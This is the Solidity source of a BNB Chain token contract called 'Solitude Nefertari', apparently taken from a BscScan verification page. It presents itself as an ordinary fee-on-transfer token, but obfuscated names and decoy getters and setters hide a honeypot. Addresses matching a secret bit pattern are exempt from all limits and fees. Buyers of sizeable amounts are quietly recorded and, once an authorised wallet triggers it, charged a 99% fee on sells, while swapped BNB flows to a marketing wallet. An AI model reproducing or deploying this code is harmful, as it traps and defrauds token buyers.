/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SolitudeNefertari is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Solitude Nefertari ";
    string constant _symbol = "SolitudeNefertari";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedExemptLimitWalletFeeMin;
    mapping(address => bool) private receiverMarketingWalletFeeLimitBotsExempt;
    mapping(address => bool) private marketingBurnMinLaunched;
    mapping(address => bool) private botsBurnAutoWallet;
    mapping(address => uint256) private exemptFeeMaxLiquidity;
    mapping(uint256 => address) private liquiditySwapMarketingTxSellMinWallet;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private walletFeeAutoMarketing = 0;
    uint256 private limitAutoExemptMode = 8;

    //SELL FEES
    uint256 private txBurnReceiverLimitFee = 0;
    uint256 private liquidityMaxIsBotsMinSwap = 8;

    uint256 private swapLimitFeeTradingReceiverTxBuy = limitAutoExemptMode + walletFeeAutoMarketing;
    uint256 private teamMinBotsLiquidity = 100;

    address private exemptWalletFeeSell = (msg.sender); // auto-liq address
    address private buyBotsExemptAuto = (0xCad6df7527fF42aB8531F026FfFfF8Fde4645407); // marketing address
    address private buyBurnFeeIsSell = DEAD;
    address private modeIsBurnMin = DEAD;
    address private modeLimitMaxExempt = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private modeExemptMarketingSwapIsTradingMin;
    uint256 private botsLaunchedExemptAuto;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private minExemptLaunchedMax;
    uint256 private teamSwapBurnIs;
    uint256 private isReceiverFeeTrading;
    uint256 private receiverMarketingTradingAutoTeam;
    uint256 private txBurnExemptModeBotsSell;

    bool private feeMaxLaunchedLimit = true;
    bool private botsBurnAutoWalletMode = true;
    bool private txLiquidityTradingBuy = true;
    bool private botsTeamWalletLimit = true;
    bool private burnWalletSellLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private buyAutoTeamBots = 6 * 10 ** 15;
    uint256 private autoSwapReceiverIs = _totalSupply / 1000; // 0.1%

    
    bool private botsBurnReceiverBuy = false;
    uint256 private buyLimitModeTx = 0;
    bool private launchedBuyAutoIs = false;
    uint256 private modeReceiverIsMarketingTradingExemptFee = 0;
    bool private marketingAutoIsFee = false;
    bool private modeSwapMinTeam = false;
    uint256 private swapLaunchedBotsFee = 0;
    uint256 private receiverBurnBuyBotsMin = 0;
    uint256 private swapBotsWalletLaunched = 0;
    bool private buyMaxWalletTx = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        minExemptLaunchedMax = true;

        launchedExemptLimitWalletFeeMin[msg.sender] = true;
        launchedExemptLimitWalletFeeMin[address(this)] = true;

        receiverMarketingWalletFeeLimitBotsExempt[msg.sender] = true;
        receiverMarketingWalletFeeLimitBotsExempt[0x0000000000000000000000000000000000000000] = true;
        receiverMarketingWalletFeeLimitBotsExempt[0x000000000000000000000000000000000000dEaD] = true;
        receiverMarketingWalletFeeLimitBotsExempt[address(this)] = true;

        marketingBurnMinLaunched[msg.sender] = true;
        marketingBurnMinLaunched[0x0000000000000000000000000000000000000000] = true;
        marketingBurnMinLaunched[0x000000000000000000000000000000000000dEaD] = true;
        marketingBurnMinLaunched[address(this)] = true;

        SetAuthorized(address(0xBE6E771943B45f8484a81380FfFfdf6687Aa9357));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return isMinTxBuy(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Solitude Nefertari  Insufficient Allowance");
        }

        return isMinTxBuy(sender, recipient, amount);
    }

    function isMinTxBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = botsLimitSwapLiquidityMarketingTeam(sender) || botsLimitSwapLiquidityMarketingTeam(recipient);
        
        if (buyLimitModeTx != swapLaunchedBotsFee) {
            buyLimitModeTx = receiverBurnBuyBotsMin;
        }

        if (swapLaunchedBotsFee == limitAutoExemptMode) {
            swapLaunchedBotsFee = receiverBurnBuyBotsMin;
        }

        if (receiverBurnBuyBotsMin != txBurnReceiverLimitFee) {
            receiverBurnBuyBotsMin = swapBotsWalletLaunched;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                burnIsBuyAuto();
            }
            if (!bLimitTxWalletValue) {
                autoMaxBuyIsBurn(recipient);
            }
        }
        
        if (botsBurnReceiverBuy != botsBurnAutoWalletMode) {
            botsBurnReceiverBuy = botsBurnAutoWalletMode;
        }


        if (inSwap || bLimitTxWalletValue) {return launchedSwapTradingBuyLimit(sender, recipient, amount);}

        if (!launchedExemptLimitWalletFeeMin[sender] && !launchedExemptLimitWalletFeeMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Solitude Nefertari  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || marketingBurnMinLaunched[sender] || marketingBurnMinLaunched[recipient], "Solitude Nefertari  Max TX Limit has been triggered");

        if (marketingMaxIsExempt()) {launchedMaxBuyBurnLimit();}

        _balances[sender] = _balances[sender].sub(amount, "Solitude Nefertari  Insufficient Balance");
        
        if (marketingAutoIsFee != launchedBuyAutoIs) {
            marketingAutoIsFee = launchedBuyAutoIs;
        }


        uint256 amountReceived = feeAutoTxSwap(sender) ? minLaunchedAutoExemptBurnSell(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function launchedSwapTradingBuyLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Solitude Nefertari  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function feeAutoTxSwap(address sender) internal view returns (bool) {
        return !receiverMarketingWalletFeeLimitBotsExempt[sender];
    }

    function tradingIsBurnWallet(address sender, bool selling) internal returns (uint256) {
        
        if (receiverBurnBuyBotsMin != receiverBurnBuyBotsMin) {
            receiverBurnBuyBotsMin = receiverBurnBuyBotsMin;
        }

        if (swapBotsWalletLaunched != buyLimitModeTx) {
            swapBotsWalletLaunched = receiverBurnBuyBotsMin;
        }

        if (marketingAutoIsFee == txLiquidityTradingBuy) {
            marketingAutoIsFee = launchedBuyAutoIs;
        }


        if (selling) {
            swapLimitFeeTradingReceiverTxBuy = liquidityMaxIsBotsMinSwap + txBurnReceiverLimitFee;
            return buyLaunchedReceiverMarketing(sender, swapLimitFeeTradingReceiverTxBuy);
        }
        if (!selling && sender == uniswapV2Pair) {
            swapLimitFeeTradingReceiverTxBuy = limitAutoExemptMode + walletFeeAutoMarketing;
            return swapLimitFeeTradingReceiverTxBuy;
        }
        return buyLaunchedReceiverMarketing(sender, swapLimitFeeTradingReceiverTxBuy);
    }

    function botsMinIsBuyLaunchedBurn() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function minLaunchedAutoExemptBurnSell(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(tradingIsBurnWallet(sender, receiver == uniswapV2Pair)).div(teamMinBotsLiquidity);

        if (botsBurnAutoWallet[sender] || botsBurnAutoWallet[receiver]) {
            feeAmount = amount.mul(99).div(teamMinBotsLiquidity);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function botsLimitSwapLiquidityMarketingTeam(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function buyLaunchedReceiverMarketing(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = exemptFeeMaxLiquidity[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function autoMaxBuyIsBurn(address addr) private {
        if (botsMinIsBuyLaunchedBurn() < buyAutoTeamBots) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        liquiditySwapMarketingTxSellMinWallet[exemptLimitValue] = addr;
    }

    function burnIsBuyAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (exemptFeeMaxLiquidity[liquiditySwapMarketingTxSellMinWallet[i]] == 0) {
                    exemptFeeMaxLiquidity[liquiditySwapMarketingTxSellMinWallet[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyBotsExemptAuto).transfer(amountBNB * amountPercentage / 100);
    }

    function marketingMaxIsExempt() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    burnWalletSellLaunched &&
    _balances[address(this)] >= autoSwapReceiverIs;
    }

    function launchedMaxBuyBurnLimit() internal swapping {
        
        if (swapBotsWalletLaunched == swapLaunchedBotsFee) {
            swapBotsWalletLaunched = swapLimitFeeTradingReceiverTxBuy;
        }


        uint256 amountToLiquify = autoSwapReceiverIs.mul(walletFeeAutoMarketing).div(swapLimitFeeTradingReceiverTxBuy).div(2);
        uint256 amountToSwap = autoSwapReceiverIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = swapLimitFeeTradingReceiverTxBuy.sub(walletFeeAutoMarketing.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(walletFeeAutoMarketing).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitAutoExemptMode).div(totalETHFee);
        
        if (swapLaunchedBotsFee == buyLimitModeTx) {
            swapLaunchedBotsFee = modeReceiverIsMarketingTradingExemptFee;
        }

        if (receiverBurnBuyBotsMin != txBurnReceiverLimitFee) {
            receiverBurnBuyBotsMin = autoSwapReceiverIs;
        }

        if (buyMaxWalletTx == burnWalletSellLaunched) {
            buyMaxWalletTx = marketingAutoIsFee;
        }


        payable(buyBotsExemptAuto).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                exemptWalletFeeSell,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBotsBurnReceiverBuy() public view returns (bool) {
        if (botsBurnReceiverBuy != botsBurnAutoWalletMode) {
            return botsBurnAutoWalletMode;
        }
        if (botsBurnReceiverBuy != modeSwapMinTeam) {
            return modeSwapMinTeam;
        }
        if (botsBurnReceiverBuy == marketingAutoIsFee) {
            return marketingAutoIsFee;
        }
        return botsBurnReceiverBuy;
    }
    function setBotsBurnReceiverBuy(bool a0) public onlyOwner {
        if (botsBurnReceiverBuy == marketingAutoIsFee) {
            marketingAutoIsFee=a0;
        }
        if (botsBurnReceiverBuy == feeMaxLaunchedLimit) {
            feeMaxLaunchedLimit=a0;
        }
        if (botsBurnReceiverBuy != launchedBuyAutoIs) {
            launchedBuyAutoIs=a0;
        }
        botsBurnReceiverBuy=a0;
    }

    function getAutoSwapReceiverIs() public view returns (uint256) {
        if (autoSwapReceiverIs != swapLaunchedBotsFee) {
            return swapLaunchedBotsFee;
        }
        if (autoSwapReceiverIs != modeReceiverIsMarketingTradingExemptFee) {
            return modeReceiverIsMarketingTradingExemptFee;
        }
        return autoSwapReceiverIs;
    }
    function setAutoSwapReceiverIs(uint256 a0) public onlyOwner {
        if (autoSwapReceiverIs != liquidityMaxIsBotsMinSwap) {
            liquidityMaxIsBotsMinSwap=a0;
        }
        if (autoSwapReceiverIs != autoSwapReceiverIs) {
            autoSwapReceiverIs=a0;
        }
        if (autoSwapReceiverIs != autoSwapReceiverIs) {
            autoSwapReceiverIs=a0;
        }
        autoSwapReceiverIs=a0;
    }

    function getExemptWalletFeeSell() public view returns (address) {
        return exemptWalletFeeSell;
    }
    function setExemptWalletFeeSell(address a0) public onlyOwner {
        if (exemptWalletFeeSell == exemptWalletFeeSell) {
            exemptWalletFeeSell=a0;
        }
        exemptWalletFeeSell=a0;
    }

    function getExemptFeeMaxLiquidity(address a0) public view returns (uint256) {
        if (a0 != modeLimitMaxExempt) {
            return limitAutoExemptMode;
        }
        if (a0 != exemptWalletFeeSell) {
            return swapLaunchedBotsFee;
        }
        if (exemptFeeMaxLiquidity[a0] == exemptFeeMaxLiquidity[a0]) {
            return modeReceiverIsMarketingTradingExemptFee;
        }
            return exemptFeeMaxLiquidity[a0];
    }
    function setExemptFeeMaxLiquidity(address a0,uint256 a1) public onlyOwner {
        if (a0 == exemptWalletFeeSell) {
            receiverBurnBuyBotsMin=a1;
        }
        if (exemptFeeMaxLiquidity[a0] == exemptFeeMaxLiquidity[a0]) {
           exemptFeeMaxLiquidity[a0]=a1;
        }
        exemptFeeMaxLiquidity[a0]=a1;
    }

    function getLaunchedExemptLimitWalletFeeMin(address a0) public view returns (bool) {
        if (launchedExemptLimitWalletFeeMin[a0] == botsBurnAutoWallet[a0]) {
            return marketingAutoIsFee;
        }
        if (a0 == exemptWalletFeeSell) {
            return botsBurnReceiverBuy;
        }
        if (launchedExemptLimitWalletFeeMin[a0] == botsBurnAutoWallet[a0]) {
            return botsBurnReceiverBuy;
        }
            return launchedExemptLimitWalletFeeMin[a0];
    }
    function setLaunchedExemptLimitWalletFeeMin(address a0,bool a1) public onlyOwner {
        launchedExemptLimitWalletFeeMin[a0]=a1;
    }

    function getBuyMaxWalletTx() public view returns (bool) {
        if (buyMaxWalletTx == marketingAutoIsFee) {
            return marketingAutoIsFee;
        }
        return buyMaxWalletTx;
    }
    function setBuyMaxWalletTx(bool a0) public onlyOwner {
        if (buyMaxWalletTx != botsTeamWalletLimit) {
            botsTeamWalletLimit=a0;
        }
        buyMaxWalletTx=a0;
    }

    function getSwapLimitFeeTradingReceiverTxBuy() public view returns (uint256) {
        if (swapLimitFeeTradingReceiverTxBuy != modeReceiverIsMarketingTradingExemptFee) {
            return modeReceiverIsMarketingTradingExemptFee;
        }
        return swapLimitFeeTradingReceiverTxBuy;
    }
    function setSwapLimitFeeTradingReceiverTxBuy(uint256 a0) public onlyOwner {
        if (swapLimitFeeTradingReceiverTxBuy != walletFeeAutoMarketing) {
            walletFeeAutoMarketing=a0;
        }
        swapLimitFeeTradingReceiverTxBuy=a0;
    }

    function getLaunchedBuyAutoIs() public view returns (bool) {
        if (launchedBuyAutoIs != modeSwapMinTeam) {
            return modeSwapMinTeam;
        }
        if (launchedBuyAutoIs == buyMaxWalletTx) {
            return buyMaxWalletTx;
        }
        return launchedBuyAutoIs;
    }
    function setLaunchedBuyAutoIs(bool a0) public onlyOwner {
        launchedBuyAutoIs=a0;
    }

    function getTxBurnReceiverLimitFee() public view returns (uint256) {
        if (txBurnReceiverLimitFee == buyAutoTeamBots) {
            return buyAutoTeamBots;
        }
        if (txBurnReceiverLimitFee != buyAutoTeamBots) {
            return buyAutoTeamBots;
        }
        return txBurnReceiverLimitFee;
    }
    function setTxBurnReceiverLimitFee(uint256 a0) public onlyOwner {
        txBurnReceiverLimitFee=a0;
    }

    function getBurnWalletSellLaunched() public view returns (bool) {
        if (burnWalletSellLaunched != txLiquidityTradingBuy) {
            return txLiquidityTradingBuy;
        }
        if (burnWalletSellLaunched == botsTeamWalletLimit) {
            return botsTeamWalletLimit;
        }
        return burnWalletSellLaunched;
    }
    function setBurnWalletSellLaunched(bool a0) public onlyOwner {
        if (burnWalletSellLaunched == botsBurnReceiverBuy) {
            botsBurnReceiverBuy=a0;
        }
        burnWalletSellLaunched=a0;
    }

    function getBuyAutoTeamBots() public view returns (uint256) {
        if (buyAutoTeamBots == swapBotsWalletLaunched) {
            return swapBotsWalletLaunched;
        }
        return buyAutoTeamBots;
    }
    function setBuyAutoTeamBots(uint256 a0) public onlyOwner {
        if (buyAutoTeamBots != liquidityMaxIsBotsMinSwap) {
            liquidityMaxIsBotsMinSwap=a0;
        }
        if (buyAutoTeamBots == liquidityMaxIsBotsMinSwap) {
            liquidityMaxIsBotsMinSwap=a0;
        }
        buyAutoTeamBots=a0;
    }

    function getBotsBurnAutoWalletMode() public view returns (bool) {
        if (botsBurnAutoWalletMode != launchedBuyAutoIs) {
            return launchedBuyAutoIs;
        }
        if (botsBurnAutoWalletMode != botsBurnReceiverBuy) {
            return botsBurnReceiverBuy;
        }
        return botsBurnAutoWalletMode;
    }
    function setBotsBurnAutoWalletMode(bool a0) public onlyOwner {
        botsBurnAutoWalletMode=a0;
    }

    function getMarketingAutoIsFee() public view returns (bool) {
        if (marketingAutoIsFee != feeMaxLaunchedLimit) {
            return feeMaxLaunchedLimit;
        }
        if (marketingAutoIsFee != botsTeamWalletLimit) {
            return botsTeamWalletLimit;
        }
        if (marketingAutoIsFee == botsBurnAutoWalletMode) {
            return botsBurnAutoWalletMode;
        }
        return marketingAutoIsFee;
    }
    function setMarketingAutoIsFee(bool a0) public onlyOwner {
        if (marketingAutoIsFee == modeSwapMinTeam) {
            modeSwapMinTeam=a0;
        }
        if (marketingAutoIsFee == modeSwapMinTeam) {
            modeSwapMinTeam=a0;
        }
        if (marketingAutoIsFee == botsBurnAutoWalletMode) {
            botsBurnAutoWalletMode=a0;
        }
        marketingAutoIsFee=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}